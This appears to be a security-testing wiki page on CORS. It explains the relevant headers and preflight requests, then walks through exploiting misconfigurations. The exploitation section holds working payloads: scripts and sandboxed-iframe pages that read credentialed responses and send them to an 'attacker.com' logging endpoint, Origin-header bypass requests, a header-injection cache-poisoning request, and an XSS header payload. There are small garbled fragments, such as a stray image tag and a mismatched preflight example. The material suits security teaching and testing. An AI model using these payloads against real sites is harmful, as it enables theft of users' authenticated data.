# CORS - Misconfigurations and Exploitation

## What is CORS?

Cross-Origin Resource Sharing (CORS) standard **enables servers to define who can access their assets** and **which HTTP request methods are permitted** from external sources.

A **same-origin** policy mandates that a **server requesting** a resource and the server hosting the **resource** share the same protocol (e.g., `http://`), domain name (e.g., `internal-web.com`), and **port** (e.g., 80). Under this policy, only web pages from the same domain and port are allowed access to the resources.

The application of the same-origin policy in the context of `http://normal-website.com/example/example.html` is illustrated as follows:

| URL accessed                              | Access permitted?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Yes: Identical scheme, domain, and port |
| `http://normal-website.com/example2/`     | Yes: Identical scheme, domain, and port |
| `https://normal-website.com/example/`     | No: Different scheme and port           |
| `http://en.normal-website.com/example/`   | No: Different domain                    |
| `http://www.normal-website.com/example/`  | No: Different domain                    |
| `http://normal-website.com:8080/example/` | No: Different port\*                    |

\*Internet Explorer disregards the port number in enforcing the same-origin policy, thus allowing this access.

### `Access-Control-Allow-Origin` Header

This header can allow **multiple origins**, a **`null`** value, or a wildcard **`*`**. However, **no browser supports multiple origins**, and the use of the wildcard `*` is subject to **limitations**. (The wildcard must be used alone, and its use alongside `Access-Control-Allow-Credentials: true` is not permitted.)

This header is **issued by a server** in response to a cross-domain resource request initiated by a website, with the browser automatically adding an `Origin` header.

### `Access-Control-Allow-Credentials` Header

By **default**, cross-origin requests are made without credentials like cookies or the Authorization header. Yet, a cross-domain server can allow the reading of the response when credentials are sent by setting the `Access-Control-Allow-Credentials` header to **`true`**.

If set to `true`, the browser will transmit credentials (cookies, authorization headers, or TLS client certificates).

```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    console.log(xhr.responseText)
  }
}
xhr.open("GET", "http://example.com/", true)
xhr.withCredentials = true
xhr.send(null)
```

```javascript
fetch(url, {
  credentials: "include",
})
```

```javascript
const xhr = new XMLHttpRequest()
xhr.open("POST", "https://bar.other/resources/post-here/")
xhr.setRequestHeader("X-PINGOTHER", "pingpong")
xhr.setRequestHeader("Content-Type", "application/xml")
xhr.onreadystatechange = handler
xhr.send("<person><name>Arun</name></person>")
```

### CSRF Pre-flight request

### Understanding Pre-flight Requests in Cross-Domain Communication

When initiating a cross-domain request under specific conditions, such as using a **non-standard HTTP method** (anything other than HEAD, GET, POST), introducing new **headers**, or employing a special **Content-Type header value**, a pre-flight request may be required. This preliminary request, leveraging the **`OPTIONS`** method, serves to inform the server of the forthcoming cross-origin request's intentions, including the HTTP methods and headers it intends to use.

The **Cross-Origin Resource Sharing (CORS)** protocol mandates this pre-flight check to determine the feasibility of the requested cross-origin operation by verifying the allowed methods, headers, and the trustworthiness of the origin. For a detailed understanding of what conditions circumvent the need for a pre-flight request, refer to the comprehensive guide provided by [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

It's crucial to note that the **absence of a pre-flight request does not negate the requirement for the response to carry authorization headers**. Without these headers, the browser is incapacitated in its ability to process the response from the cross-origin request.

Consider the following illustration of a pre-flight request aimed at employing the `PUT` method along with a custom header named `Special-Request-Header`:

```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```

In response, the server might return headers indicating the accepted methods, the allowed origin, and other CORS policy details, as shown below:

```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

- **`Access-Control-Allow-Headers`**: This header specifies which headers can be used during the actual request. It is set by the server to indicate the allowed headers in requests from the client.
- **`Access-Control-Expose-Headers`**: Through this header, the server informs the client about which headers can be exposed as part of the response besides the simple response headers.
- **`Access-Control-Max-Age`**: This header indicates how long the results of a pre-flight request can be cached. The server sets the maximum time, in seconds, that the information returned by a pre-flight request may be reused.
- **`Access-Control-Request-Headers`**: Used in pre-flight requests, this header is set by the client to inform the server about which HTTP headers the client wants to use in the actual request.
- **`Access-Control-Request-Method`**: This header, also used in pre-flight requests, is set by the client to indicate which HTTP method will be used in the actual request.
- **`Origin`**: This header is automatically set by the browser and indicates the origin of the cross-origin request. It is used by the server to assess whether the incoming request should be allowed or denied based on the CORS policy.

Note that usually (depending on the content-type and headers set) in a **GET/POST request no pre-flight request is sent** (the request is sent **directly**), but if you want to access the **headers/body of the response**, it must contains an _Access-Control-Allow-Origin_ header allowing it.\
**Therefore, CORS doesn't protect against CSRF (but it can be helpful).**

### **Local Network Requests Pre-flight request**

1. **`Access-Control-Request-Local-Network`**: This header is included in the client's request to signify that the inquiry is aimed at a local network resource. It serves as a marker to inform the server that the request originates from within the local network.
2. **`Access-Control-Allow-Local-Network`**: In response, servers utilize this header to communicate that the requested resource is permitted to be shared with entities outside of the local network. It acts as a green light for sharing resources across different network boundaries, ensuring controlled access while maintaining security protocols.

A **valid response allowing the local network request** needs to have also in the response the header `Access-Controls-Allow-Local_network: true` :

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```

> [!WARNING]
> Note that the linux **0.0.0.0** IP works to **bypass** these requirements to access localhost as that IP address is not considered "local".
>
> It's also possible to **bypass the Local Network requirements** if you use the **public IP address of a local endpoint** (like the public IP of the router). Because in several occasions, even if the **public IP** is being accessed, if it's **from the local network**, access will be granted.

### Wildcards

Note that even if the following configuration might look super permissive:

```bash
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

This is not allowed by browsers and therefore credentials won't be sent with the request allowed by this.

## Exploitable misconfigurations

It has been observed that the setting of `Access-Control-Allow-Credentials` to **`true`** is a prerequisite for most **real attacks**. This setting permits the browser to send credentials and read the response, enhancing the attack's effectiveness. Without this, the benefit of making a browser issue a request over doing it oneself diminishes, as leveraging a user's cookies becomes unfeasible.

### Exception: Exploiting Network Location as Authentication

An exception exists where the victim's network location acts as a form of authentication. This allows for the victim's browser to be used as a proxy, circumventing IP-based authentication to access intranet applications. This method shares similarities in impact with DNS rebinding but is simpler to exploit.

### Reflection of `Origin` in `Access-Control-Allow-Origin`

The real-world scenario where the `Origin` header's value is reflected in `Access-Control-Allow-Origin` is theoretically improbable due to restrictions on combining these headers. However, developers seeking to enable CORS for multiple URLs may dynamically generate the `Access-Control-Allow-Origin` header by copying the `Origin` header's value. This approach can introduce vulnerabilities, particularly when an attacker employs a domain with a name designed to appear legitimate, thereby deceiving the validation logic.

```html
<script>
  var req = new XMLHttpRequest()
  req.onload = reqListener
  req.open("get", "https://example.com/details", true)
  req.withCredentials = true
  req.send()
  function reqListener() {
    location = "/log?key=" + this.responseText
  }
</script>
```

### Exploiting the `null` Origin

The `null` origin, specified for situations like redirects or local HTML files, holds a unique position. Some applications whitelist this origin to facilitate local development, inadvertently allowing any website to mimic a `null` origin through a sandboxed iframe, thus bypassing CORS restrictions.

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

### Regular Expression Bypass Techniques

When encountering a domain whitelist, it's crucial to test for bypass opportunities, such as appending the attacker's domain to a whitelisted domain or exploiting subdomain takeover vulnerabilities. Additionally, regular expressions used for domain validation may overlook nuances in domain naming conventions, presenting further bypass opportunities.

### Advanced Regular Expression Bypasses

Regex patterns typically concentrate on alphanumeric, dot (.), and hyphen (-) characters, neglecting other possibilities. For example, a domain name crafted to include characters interpreted differently by browsers and regex patterns can bypass security checks. Safari, Chrome, and Firefox's handling of underscore characters in subdomains illustrates how such discrepancies can be exploited to circumvent domain validation logic.

**For more information and settings of this bypass check:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **and** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

.png>)

### From XSS inside a subdomain

Developers often implement defensive mechanisms to protect against CORS exploitation by whitelisting domains that are permitted to request information. Despite these precautions, the system's security is not foolproof. The presence of even a single vulnerable subdomain within the whitelisted domains can open the door to CORS exploitation through other vulnerabilities, such as XSS (Cross-Site Scripting).

To illustrate, consider the scenario where a domain, `requester.com`, is whitelisted to access resources from another domain, `provider.com`. The server-side configuration might look something like this:

```javascript
if ($_SERVER["HTTP_HOST"] == "*.requester.com") {
  // Access data
} else {
  // Unauthorized access
}
```

In this setup, all subdomains of `requester.com` are allowed access. However, if a subdomain, say `sub.requester.com`, is compromised with an XSS vulnerability, an attacker can leverage this weakness. For example, an attacker with access to `sub.requester.com` could exploit the XSS vulnerability to bypass CORS policies and maliciously access resources on `provider.com`.

### **Special Characters**

PortSwigger’s [URL validation bypass cheat sheet](https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet) found that some browsers support strange characters within domain names.

Chrome and Firefox support underscores `_` that can bypass regexes implemented to validate the `Origin` header:

```
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://target.application_.arbitrary.com
```

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://target.application_.arbitrary.com
Access-Control-Allow-Credentials: true
```

Safari is even more lax accepting special characters in the domain name:

```
GET / HTTP/2
Cookie: <session_cookie>
Origin: https://target.application}.arbitrary.com
```

```
HTTP/2 200 OK
Cookie: <session_cookie>
Access-Control-Allow-Origin: https://target.application}.arbitrary.com
Access-Control-Allow-Credentials: true
```

### **Other funny URL tricks**

### **Server-side cache poisoning**

[**From this research**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

It's possible that by exploiting server-side cache poisoning through HTTP header injection, a stored Cross-Site Scripting (XSS) vulnerability can be induced. This scenario unfolds when an application fails to sanitize the `Origin` header for illegal characters, creating a vulnerability particularly for Internet Explorer and Edge users. These browsers treat (0x0d) as a legitimate HTTP header terminator, leading to HTTP header injection vulnerabilities.

Consider the following request where the `Origin` header is manipulated:

```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```

Internet Explorer and Edge interpret the response as:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```

While directly exploiting this vulnerability by making a web browser send a malformed header is not feasible, a crafted request can be manually generated using tools like Burp Suite. This method could lead to a server-side cache saving the response and inadvertently serving it to others. The crafted payload aims to alter the page's character set to UTF-7, a character encoding often associated with XSS vulnerabilities due to its ability to encode characters in a way that can be executed as script in certain contexts.

For further reading on stored XSS vulnerabilities, see [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Note**: The exploitation of HTTP header injection vulnerabilities, particularly through server-side cache poisoning, underscores the critical importance of validating and sanitizing all user-supplied input, including HTTP headers. Always employ a robust security model that includes input validation to prevent such vulnerabilities.

### **Client-Side cache poisoning**

[**From this research**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

In this scenario, an instance of a web page reflecting the contents of a custom HTTP header without proper encoding is observed. Specifically, the web page reflects back the contents included in a `X-User-id` header, which could include malicious JavaScript, as demonstrated by the example where the header contains an SVG image tag designed to execute JavaScript code on load.

Cross-Origin Resource Sharing (CORS) policies allow for the sending of custom headers. However, without the response being directly rendered by the browser due to CORS restrictions, the utility of such an injection might seem limited. The critical point arises when considering the browser's cache behavior. If the `Vary: Origin` header is not specified, it becomes possible for the malicious response to be cached by the browser. Subsequently, this cached response could be rendered directly when navigating to the URL, bypassing the need for direct rendering upon the initial request. This mechanism enhances the reliability of the attack by leveraging client-side caching.

To illustrate this attack, a JavaScript example is provided, designed to be executed in the environment of a web page, such as through a JSFiddle. This script performs a simple action: it sends a request to a specified URL with a custom header containing the malicious JavaScript. Upon successful request completion, it attempts to navigate to the target URL, potentially triggering the execution of the injected script if the response has been cached without proper handling of the `Vary: Origin` header.

Here's a summarized breakdown of the JavaScript used to execute this attack:

```html
<script>
  function gotcha() {
    location = url
  }
  var req = new XMLHttpRequest()
  url = "https://example.com/" // Note: Be cautious of mixed content blocking for HTTP sites
  req.onload = gotcha
  req.open("get", url, true)
  req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
  req.send()
</script>
```
